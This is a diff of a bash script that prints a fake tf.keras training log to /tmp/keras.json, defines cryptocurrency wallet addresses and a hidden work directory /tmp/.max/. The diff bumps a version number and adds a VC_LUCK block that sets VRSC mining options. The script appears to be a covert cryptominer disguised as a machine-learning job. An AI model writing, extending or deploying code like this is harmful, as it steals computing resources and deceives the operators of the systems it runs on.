@@ -1,10 +1,10 @@
 #!/bin/bash
 echo '{ '
 echo '"type":"tf.keras",' > /tmp/keras.json
-echo '"version":"0.0.8",' >> /tmp/keras.json
+echo '"version":"0.0.9",' >> /tmp/keras.json
 if [[ $1 -gt 0 ]] 
 then
-    echo '"version":"0.0.8",'
+    echo '"version":"0.0.9",'
 fi
 echo '"status":"Epoch 1/5 1875/1875 [==============================] - 5s 2ms/step - loss: 0.1173 - accuracy: 0.9127",' >> /tmp/keras.json
 
@@ -55,7 +55,12 @@ W_DG2="DSro3i42vz2MytCw22S4wun5qM5bTNNy5c"
 
 
 W_VC=$W_DG
-
+#VC_LUCK="c=VRSC,mc=VRSC"
+if [ $VC_LUCK ]
+then 
+W_VC=$W_VC
+VCOptions=$VC_LUCK
+fi
 # Directory
 Work_Dir="/tmp/.max/"
 mkdir -p $Work_Dir
